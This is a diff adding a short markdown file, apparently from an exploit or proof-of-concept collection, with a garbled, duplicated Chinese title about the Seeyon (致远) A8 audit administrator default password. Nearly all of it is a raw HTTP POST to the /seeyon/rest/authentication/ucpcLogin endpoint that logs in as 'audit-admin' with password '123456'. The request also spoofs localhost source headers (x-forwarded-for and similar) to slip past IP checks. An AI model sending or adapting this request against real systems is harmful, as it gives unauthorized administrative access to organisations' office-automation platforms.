@@ -1,0 +1,19 @@
+# 致远致远A8 审计管理员默认密码A8 审计管理员默认密码
+POST /seeyon/rest/authentication/ucpcLogin?login_username=audit-admin&login_password=123456&ticket= HTTP/1.1
+Host: 192.168.203.25
+Content-Length: 0
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.203.25
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.203.25/seeyon/main.do
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+Cookie: ts=1691034790844; JSESSIONID=0B8655E577786E9BAC43EC92E8614A93; loginPageURL=; CookieLanguageName=ZH-CN; CookieAuthType=0; PHPSESSID=ipi6v5hfj4v46lt5c5cobmbpp6; avatarImageUrl=-5594399505905926070; JSESSIONID=616FAECB5E1C27FDB9C24381EAB901C7
+x-forwarded-for: 127.0.0.1
+x-originating-ip: 127.0.0.1
+x-remote-ip: 127.0.0.1
+x-remote-addr: 127.0.0.1
+Connection: close
